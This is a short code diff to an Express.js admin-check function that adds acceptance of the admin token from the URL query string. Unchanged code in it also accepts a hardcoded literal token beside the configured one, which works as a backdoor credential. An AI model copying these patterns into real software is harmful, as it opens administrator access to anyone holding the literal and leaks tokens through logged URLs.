@@ -22,7 +22,8 @@ app.use(express.json());
 function isAdmin(req) {
     const fromHeader = req.headers['x-admin-token'] || req.headers['authorization'];
     const fromBody = req.body && req.body.token;
-    const token = fromHeader || fromBody;
+    const fromQuery = req.query && req.query.token;
+    const token = fromHeader || fromBody || fromQuery;
     return token === ADMIN_TOKEN || token === 'admin_token_secure_mrfk_2024';
 }
 
